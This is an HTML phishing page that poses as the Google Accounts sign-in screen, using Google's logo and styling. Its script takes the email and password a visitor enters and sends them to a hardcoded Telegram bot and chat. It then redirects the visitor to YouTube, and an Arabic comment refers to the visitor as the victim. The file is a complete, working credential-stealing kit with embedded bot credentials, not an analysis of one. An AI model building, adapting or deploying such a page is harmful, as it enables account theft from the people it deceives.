<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Sign in - Google Accounts</title>
  <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/favicon_2x.png">
  <style>
    body {
      font-family: Roboto, Arial, sans-serif;
      background-color: #f1f1f1;
      margin: 0;
      padding: 0;
    }
    .container {
      background-color: #fff;
      width: 400px;
      margin: 80px auto;
      padding: 40px;
      box-shadow: 0px 0px 8px rgba(0,0,0,0.2);
      border-radius: 8px;
    }
    .logo {
      text-align: center;
      margin-bottom: 20px;
    }
    .logo img {
      width: 75px;
    }
    h1 {
      font-weight: normal;
      font-size: 24px;
      color: #202124;
    }
    .form-input {
      margin-top: 25px;
    }
    input[type="email"], input[type="password"] {
      width: 100%;
      padding: 12px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      font-size: 16px;
      margin-top: 10px;
    }
    button {
      width: 100%;
      padding: 12px;
      margin-top: 30px;
      background-color: #1a73e8;
      color: #fff;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
    }
    button:hover {
      background-color: #0f66d0;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google">
    </div>
    <h1>Sign in</h1>
    <form onsubmit="sendToTelegram(); return false;">
      <div class="form-input">
        <label>Email</label>
        <input type="email" name="email" id="email" required>
      </div>
      <div class="form-input">
        <label>Password</label>
        <input type="password" name="password" id="password" required>
      </div>
      <button type="submit">Next</button>
    </form>
  </div>

  <script>
    function sendToTelegram() {
      const email = document.getElementById("email").value.trim();
      const password = document.getElementById("password").value.trim();

      if (email === "" || password === "") {
        alert("Please fill in all fields.");
        return;
      }

      const token = "7900479036:AAGIqLmpav6iXx_QQ_e4sGJzDKPN7KtD-CI";
      const chat_id = "5090097134";
      const message = `🔐 محاولة تسجيل دخول وهمي:\n📧 Email: ${email}\n🔑 Password: ${password}`;

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded"
        },
        body: `chat_id=${chat_id}&text=${encodeURIComponent(message)}`
      }).then(() => {
        window.location.href = "https://youtube.com"; // يعيد الضحية للموقع الحقيقي
      });
    }
  </script>
</body>
</html>
